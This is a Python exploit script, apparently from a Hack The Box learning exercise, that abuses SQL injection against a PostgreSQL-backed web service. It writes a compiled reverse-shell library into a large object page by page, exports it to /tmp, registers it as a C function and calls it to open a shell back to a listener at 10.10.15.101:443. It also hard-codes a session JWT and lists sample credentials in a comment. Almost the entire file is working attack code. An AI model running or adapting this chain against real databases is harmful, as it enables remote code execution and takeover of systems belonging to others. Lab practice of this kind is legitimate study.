#!/usr/bin/python3
"""
Here I will put the remote code execution from the learning path
to understand the exploit way
"""

import requests
import random
import string
from urllib.parse import quote_plus
import math

# Parameters for call to rev_shell
LHOST = "10.10.15.101"
LPORT = 443

# Generate a random string
def randomString(N):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=N))

# Create a large object
# Read the compiled extension

# Inject a query
def sqli(q):
    # TODO: Use an SQL injection to run the query `q`
    url = "10.129.90.227"

    # payload = {
    #     "title": "Hackthebox",
    #     "username": "quark55",
    #     "password": "dicker",
    #     "id": f"1 union {q} DELIMITER E'\x07'--"
    # }

    cookie = {
    "auth": "eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJkaWNrZXIiLCJpYXQiOjE2OTQ2NzA2NzMsImV4cCI6MTY5NDY3OTMxM30.oz14fUbFzojwhXGAYhontXN12HljZCx9EedAwBeJu7pDaFUksus43Ctg2wCSu3MXmMdL2q8cJ2k8TXtf37O3ZA"}

    headers = {"Content-Type": "application/x-www-form-urlencoded", 
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    response = requests.get(url=f"""http://{url}:8080/?q=arthur"; {q} DELIMITER E'\x07'-- """, cookies=cookie)

with open("pg_rev_shell.so", "rb") as f:
    raw = f.read()

# Create a large object
loid = random.randint(50000, 60000)
sqli(f"SELECT lo_create({loid});")
print(f"[*] Created large object with ID: {loid}")

# Upload pg_rev_shell.so to large object using a tab (\t) delimiter
for pageno in range(math.ceil(len(raw) / 2048)):
    page = raw[pageno * 2048: (pageno + 1) * 2048]
    tab_delimited_data = '\t'.join(f"{byte:02x}" for byte in page)
    print(f"[*] Uploading Page: {pageno}, Length: {len(page)}")
    sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{tab_delimited_data}', 'hex'));")

# Write large object to file and run reverse shell
query  = f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so');"
query += f"SELECT lo_unlink({loid});"
query += "DROP FUNCTION IF EXISTS rev_shell;"
query += "CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell.so', 'rev_shell' LANGUAGE C STRICT;"
query += f"SELECT rev_shell('{LHOST}', {LPORT});"
print(f"[*] Writing pg_rev_shell.so to disk and triggering reverse shell (LHOST: {LHOST}, LPORT: {LPORT})")


print(f"the query {query}")
sqli(query)


"""
SELECT lo_export(54152, '/tmp/pg_rev_shell.so');SELECT lo_unlink(54152);DROP FUNCTION IF EXISTS rev_shell;CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell.so', 'rev_shell' LANGUAGE C STRICT;SELECT rev_shell('10.10.15.101', 443);
"""
